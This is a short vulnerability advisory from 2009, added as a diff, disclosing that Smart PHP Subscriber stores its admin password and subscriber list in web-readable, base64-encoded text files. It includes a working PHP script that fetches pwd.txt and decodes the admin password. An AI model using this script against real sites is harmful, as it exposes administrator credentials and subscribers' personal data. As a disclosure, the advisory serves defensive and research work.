@@ -1,0 +1,48 @@
+[#-----------------------------------------------------------------------------------------------#]
+[#] Title: Smart PHP Subscriber Multiple Disclosure Vulnerabilities
+[#] Author: Milos Zivanovic
+[#] Email: milosz.security[at]gmail.com
+[#] Date: 14. December 2009.
+[#-----------------------------------------------------------------------------------------------#]
+[#] Application: Smart PHP Subscriber
+[#] Version: the only one there is
+[#] Platform: PHP
+[#] Vulnerability: Multiple Disclosure Vulnerabilities
+[#-----------------------------------------------------------------------------------------------#]
+
+[#]Content
+ |--Admin password disclosure
+ |--Subscribers list disclosure
+
+[*]Admin password disclosure
+
+Admin password is saved locally in pwd.txt file with some simple
+encoding. This is the algorithm
+used:
+base64(base64(password)+"||&@23||password>||&~||")
+
+String in "" (quotes) is constant, so we're able to decode it with
+couple lines of code. Here's the
+script to decode admins password:
+
+[DECODE-SCRIPT------------------------------------------------------------------------------------]
+<?php
+  $pwd_file = "http://localhost/smartphps/pwd.txt";
+  $half_way = base64_decode(file_get_contents($pwd_file));
+  $almost_there = explode("||&@23||password>||&~||", $half_way);
+  echo base64_decode($almost_there[0])."\n";
+?>
+[DECODE-SCRIPT------------------------------------------------------------------------------------]
+
+[-]Subscribers list disclosure
+
+List of subscribed emails is saved locally in subscribe.txt file with
+base64 encoding. Each line
+holds info about 1 subscriber. Data is inserted in this format:
+
+base64(email)+";"+base64(name)+";"+date("D
+d-M-Y")+";"+time()+";"+verified(1 or 0)+";"+line_number
+
+Using regular base64_decode function built in php we can decode emails.
+
+[#] EOF
